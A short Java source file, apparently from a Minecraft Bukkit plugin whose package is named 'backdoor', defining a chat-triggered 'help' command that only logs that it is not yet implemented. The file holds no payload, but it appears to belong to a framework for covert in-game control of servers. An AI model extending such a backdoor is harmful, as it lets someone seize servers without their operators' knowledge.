package me.tsb.backdoor.commands;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(displayName = "help", aliases = {"help"})
public class HelpCommand extends Command {
    public void onExec(PlayerChatEvent event, ArrayList<String> args) {
        Main.logger.log("Help Command in not yet implemented");
    }
}
